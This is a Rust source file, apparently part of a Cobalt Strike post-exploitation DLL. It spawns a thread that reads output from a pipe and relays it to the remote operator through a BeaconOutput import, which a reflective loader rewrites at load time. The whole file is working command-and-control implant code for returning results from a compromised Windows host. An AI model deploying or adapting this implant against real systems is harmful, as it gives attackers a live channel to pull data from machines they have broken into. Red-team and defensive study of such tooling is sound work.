//! Background reader thread: pull bytes from the orchestrator's pipe and
//! forward them to the operator via the imported `BeaconOutput`.
//!
//! Smartinject rewrites the `BeaconOutput` IAT entry at reflective load
//! time so it points at a CS proxy that writes to `pipes::G_PIPE_HANDLE`.
//! From our point of view it's just a normal extern "C" call.
//!
//! Runs in parallel with the assembly invoke so output arrives live;
//! latency = Beacon sleep cycle.

use core::ffi::c_void;
use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE};
// CreateThread expects an `Option<unsafe extern "system" fn>` — but the
// thread proc raw arg is typed `*mut c_void`, so the HANDLE→*mut c_void
// conversion happens at the call site.
use windows_sys::Win32::Storage::FileSystem::ReadFile;
use windows_sys::Win32::System::Threading::{CreateThread, INFINITE, WaitForSingleObject};

use crate::beacon_api::{CALLBACK_OUTPUT, output};

/// Thread proc: read pipe → BeaconOutput in a loop until EOF / broken pipe.
unsafe extern "system" fn thread_proc(arg: *mut c_void) -> u32 {
    unsafe {
        let pipe_read: HANDLE = arg as HANDLE;
        let mut buf = [0u8; 8192];
        loop {
            let mut n: u32 = 0;
            let ok = ReadFile(
                pipe_read,
                buf.as_mut_ptr(),
                buf.len() as u32,
                &mut n,
                core::ptr::null_mut(),
            );
            if ok == 0 || n == 0 {
                break; // EOF or ERROR_BROKEN_PIPE — write end closed.
            }
            output(CALLBACK_OUTPUT, &buf[..n as usize]);
        }
        0
    }
}

/// Spawn the reader. Caller owns the returned handle and must join it
/// before exiting the postex DLL so the final bytes aren't lost when the
/// orchestrator's IoChannel closes the write end.
pub unsafe fn spawn(pipe_read: HANDLE) -> HANDLE {
    unsafe {
        CreateThread(
            core::ptr::null(),
            0,
            Some(thread_proc),
            pipe_read,
            0,
            core::ptr::null_mut(),
        )
    }
}

/// Wait for the reader to drain, then close the thread handle.
pub unsafe fn join(thread: HANDLE) {
    unsafe {
        if thread != INVALID_HANDLE_VALUE && !thread.is_null() {
            WaitForSingleObject(thread, INFINITE);
            CloseHandle(thread);
        }
    }
}
